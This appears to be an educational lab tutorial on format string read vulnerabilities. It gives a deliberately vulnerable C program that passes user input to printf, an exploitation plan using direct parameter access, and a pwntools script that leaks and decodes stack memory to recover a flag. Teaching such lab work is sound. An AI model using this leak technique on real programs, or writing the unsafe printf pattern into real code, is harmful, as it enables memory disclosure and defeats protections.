@@ -1,1 +1,132 @@
+A Format String Read vulnerability occurs when user input is passed directly into the first argument of a formatting function (like printf(), sprintf(), or fprintf()) instead of a static format string literal.
+When you pass parameters like %p, %x, or %s as your input, the function treats them as instructions to start popping arguments from the stack or CPU registers and printing them. This allows an attacker to read raw memory values, leak cryptographic keys, bypass ASLR, or extract Stack Canaries.
 
+1. The Vulnerable C Program (fs_read.c)
+
+In this program, a secret flag is loaded into a buffer. The program then asks for user input and prints it incorrectly using printf(buffer).
+c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void leak_me() {
+    char secret_flag[64] = "FLAG{fmt_str_memory_leaks_are_fun}";
+    char user_input[128];
+
+    printf("Enter your name: ");
+    int bytes_read = read(0, user_input, 127);
+    user_input[bytes_read - 1] = '\0'; // Strip newline
+
+    // VULNERABILITY: User input is executed directly as the format specifier
+    // Correct way: printf("%s", user_input);
+    printf(user_input); 
+    printf("\n");
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    leak_me();
+    return 0;
+}
+Use code with caution.
+
+Compilation
+
+Format string bugs are application-level logic errors, meaning they work regardless of stack protections, PIE, or ASLR settings:
+bash
+gcc -m32 fs_read.c -o fs_read
+Use code with caution.
+
+2. The Mechanics of the Read
+
+When printf() is executed, it looks at its first argument for format specifiers. For every specifier it encounters, it looks at the next expected register or stack location to pull the value.
+If we send AAAA.%p.%p.%p.%p.%p.%p to the program, printf() will interpret it like this:
+text
+       Top of Stack (Lower Memory Address)
+       +------------------------------------+
+
+       | Pointer to user_input              | <-- printf thinks this is the format string
+       +------------------------------------+
+
+       | Value at Stack Position 1          | <-- printed by 1st %p
+       +------------------------------------+
+
+       | Value at Stack Position 2          | <-- printed by 2nd %p
+       +------------------------------------+
+
+       | ...                                | 
+       +------------------------------------+
+
+       | "AAAA" (Start of user_input buffer)| <-- TARGET: The offset where our input begins
+       +------------------------------------+
+Use code with caution.
+Once we discover which index position outputs our own AAAA (encoded as hex 0x41414141), we have found the format string offset.
+
+3. Step-by-Step Exploitation Plan
+
+
+Step 1: Find the Offset
+
+Instead of passing dozens of %p strings manually, we can use the Direct Parameter Access feature (%$) in POSIX standard format strings. For example, %6$p means "print the 6th argument from the stack as a pointer".
+Let's assume through initial testing we find that %4$p returns 0x41414141. This means the 4th index points directly back to the beginning of our input buffer.
+
+Step 2: Read Arbitrary Memory using %s
+
+The %s specifier treats the data sitting on the stack as a pointer to a memory address and prints the string found at that location.
+• If we place a specific target address (like the address of a global variable or a known stack location) at the beginning of our input buffer, and point our Direct Parameter Access specifier right at it using %4$s, printf() will dereference that address and read it out for us.
+
+4. The Python Exploit Script (fs_read.py)
+
+Using pwntools, we can automate searching for specific patterns or dynamically leaking the contents of variables.
+python
+#!/usr/bin/env python3
+from pwn import *
+
+# Initialize the binary process
+io = process('./fs_read')
+
+# Step 1: Find the buffer offset automatically using pwntools helpers
+def exec_fmt(payload):
+    p = process('./fs_read')
+    p.recvuntil(b"Enter your name: ")
+    p.sendline(payload)
+    return p.recvall()
+
+# Fmtstr automatically calculates the index where our input lands on the stack
+autofmt = FmtStr(exec_fmt)
+offset = autofmt.offset
+log.success(f"Discovered format string offset automatically: {offset}")
+
+# Step 2: Leak data off the stack sequentially to look for the flag
+# We can loop through stack indices to read arbitrary stack variables
+io.recvuntil(b"Enter your name: ")
+
+# Construct a leak payload leaking indices 1 through 10
+# Using python list comprehension to generate %1$p.%2$p...
+leak_payload = ".".join([f"%{i}$p" for i in range(1, 12)]).encode()
+
+log.info(f"Sending stack leak payload: {leak_payload}")
+io.sendline(leak_payload)
+
+# Receive and decode the leaked data
+leaked_output = io.recvline().strip().decode()
+log.info(f"Raw Leak: {leaked_output}")
+
+# Parse hex values back into readable ASCII text to reveal strings sitting on the stack
+chunks = leaked_output.split('.')
+decoded_string = ""
+for chunk in chunks:
+    if "nil" in chunk or "0x" not in chunk:
+        continue
+    try:
+        # Convert hex address string to bytes and reverse for little-endian if it's data
+        hex_val = chunk[2:]
+        if len(hex_val) % 2 != 0: hex_val = '0' + hex_val
+        bytes_data = bytes.fromhex(hex_val)[::-1]
+        decoded_string += bytes_data.decode('ascii', errors='ignore')
+    except Exception:
+        pass
+
+log.success(f"Decoded ASCII from stack: {decoded_string}")
+io.close()
+Use code with caution.
